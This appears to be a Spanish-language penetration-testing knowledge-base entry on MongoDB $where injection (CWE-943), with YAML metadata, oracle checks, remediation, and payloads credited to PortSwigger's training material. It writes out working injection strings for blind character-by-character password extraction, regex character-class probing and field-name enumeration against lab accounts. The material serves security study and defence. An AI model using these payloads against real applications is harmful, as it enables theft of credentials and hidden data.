---
clase: inyeccion
tech: mongodb
cwe: CWE-943
cvss: 8.6 # [derivado] extraccion de credenciales caracter a caracter
payload: |
  # INYECTAR $where COMO PARAMETRO NUEVO - LITERALES de la fuente.
  # El par sirve de oraculo: '0' es falso, '1' es cierto.
  {"username":"wiener","password":"peter", "$where":"0"}
  {"username":"wiener","password":"peter", "$where":"1"}
  #
  # EXTRACCION CARACTER A CARACTER - LITERALES de la fuente.
  # Peticion base: https://insecure-website.com/user/lookup?username=admin
  # Consulta resultante que da la fuente: {"$where":"this.username == 'admin'"}
  admin' && this.password[0] == 'a' || 'a'=='b
  #
  # COMPROBACION POR CLASE DE CARACTER (acelera: descarta rangos enteros):
  admin' && this.password.match(/\d/) || 'a'=='b
  #
  # EXISTENCIA DE UN NOMBRE DE CAMPO - LITERALES de la fuente:
  https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
  admin' && this.username!='
  admin' && this.foo!='
  #
  # ENUMERAR NOMBRES DE CAMPO con keys() - LITERAL de la fuente:
  "$where":"Object.keys(this)[0].match('^.{0}a.*')"
  #
  # Mecanica: $where ejecuta JAVASCRIPT del lado del servidor sobre cada documento.
  # El atacante no inyecta una condicion: inyecta CODIGO, con acceso a 'this'
  # (el documento completo, incluidos los campos que la consulta no devuelve).
precondicion: "El valor del usuario se inserta en una expresion $where, o se puede añadir '$where' como parametro nuevo al cuerpo. $where debe estar habilitado en el servidor MongoDB: ejecuta JavaScript y esta deshabilitado por defecto en configuraciones endurecidas y en MongoDB Atlas."
como_se_descubre: |
  Dos vias independientes:
  1. AÑADIR '$where' como clave nueva al cuerpo JSON. El par "$where":"0" / "$where":"1"
     es el oraculo: si las respuestas difieren, se esta ejecutando JavaScript.
  2. INYECTAR en una expresion $where existente, cerrando la cadena con comilla y
     añadiendo '&& ... || 'a'=='b'. El sufijo || 'a'=='b' mantiene la expresion
     sintacticamente valida con independencia del resultado.
  Lo que hace a $where mas potente que la inyeccion de operadores: 'this' da acceso al
  DOCUMENTO COMPLETO, incluidos campos que la consulta nunca devuelve al cliente. Se
  pueden leer contraseñas desde un endpoint que solo muestra nombres de usuario.
control_negativo: |
  # Control de ORACULO, obligatorio antes de extraer un solo caracter:
  # A: {"username":"wiener","password":"peter", "$where":"0"}  -> respuesta FALSA
  # B: {"username":"wiener","password":"peter", "$where":"1"}  -> respuesta CIERTA
  # Si A y B dan la MISMA respuesta, $where no se ejecuta y toda la rama muere. Es un
  # corte temprano de 2 peticiones que evita interpretar ruido como datos.
  # C: [derivado] admin' && this.foo!=' sobre un campo que SE SABE inexistente
  #    -> debe dar el resultado FALSO, y calibra el oraculo de nombres de campo.
mata: |
  - $where deshabilitado en el servidor (por defecto en configuraciones endurecidas y en
    MongoDB Atlas) -> muere.
  - A y B indistinguibles -> no se ejecuta JavaScript.
  - Allowlist de claves que rechace '$where' como parametro.
  - Validacion de tipo que impida cerrar la cadena en la expresion existente.
fuente: "https://portswigger.net/web-security/nosql-injection (secciones de inyeccion de $where, extraccion de datos y enumeracion de nombres de campo). Todos los payloads literales de la pagina."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] `$where` en MongoDB — ejecutar JavaScript sobre cada documento

## Principio
`$where` evalúa una expresión JavaScript del lado del servidor contra cada documento de
la colección. El atacante que llega ahí no inyecta una condición: inyecta **código**, con
acceso a `this` — el documento completo, incluidos los campos que la consulta nunca
devuelve al cliente.

Esa es la diferencia con la inyección de operadores. Con `$ne` se manipula la condición de
búsqueda; con `$where` se lee cualquier campo desde cualquier endpoint que consulte la
colección. Un endpoint que solo muestra nombres de usuario sirve para extraer contraseñas.

## Payload
Inyectar `$where` como parámetro nuevo, que es también el oráculo:

```json
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

Extracción carácter a carácter, sobre una consulta `{"$where":"this.username == 'admin'"}`:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

El sufijo `|| 'a'=='b'` no es decorativo: mantiene la expresión sintácticamente válida
con independencia del resultado de la comparación, que es lo que permite que el oráculo
sea limpio.

Comprobación por clase de carácter, que descarta rangos enteros de golpe:

```
admin' && this.password.match(/\d/) || 'a'=='b
```

Existencia de un nombre de campo:

```
admin' && this.username!='
admin' && this.foo!='
```

Y enumeración de nombres de campo, sin conocer el esquema:

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

## El oráculo se calibra con `0` y `1`
Dos peticiones, antes de extraer un solo carácter. Si `"$where":"0"` y `"$where":"1"`
producen la misma respuesta, `$where` no se está ejecutando y toda la rama está
descartada. Es el mismo corte temprano que en los writeups de SQLi ciego, y por la misma
razón: sin oráculo verificado, cada respuesta posterior es ruido que se interpreta como
señal, y lo que sale es una contraseña inventada de aspecto perfectamente coherente.

## Por qué `match` antes que comparación directa
`this.password.match(/\d/)` responde "¿es un dígito?" en una petición, en lugar de probar
diez candidatos. Enumerar clases antes que caracteres reduce el número de peticiones en
un orden de magnitud, lo que importa cuando hay limitación de peticiones.

## Impacto
Lectura de cualquier campo de cualquier documento de la colección, carácter a carácter,
desde cualquier endpoint que la consulte — incluidos hashes de contraseña y campos que la
API no expone. Y como `$where` ejecuta JavaScript por documento, también es un vector de
denegación de servicio por coste computacional.

## Remediación
De la fuente: allowlist de claves aceptadas, consultas parametrizadas, y validación con
allowlist de caracteres.

`# [derivado]`: la medida más eficaz es **deshabilitar `$where` en el servidor**, que es
el comportamiento por defecto en configuraciones endurecidas y en MongoDB Atlas. Permite
ejecutar JavaScript arbitrario del lado servidor, así que su superficie de riesgo excede
con mucho su utilidad en la mayoría de aplicaciones.
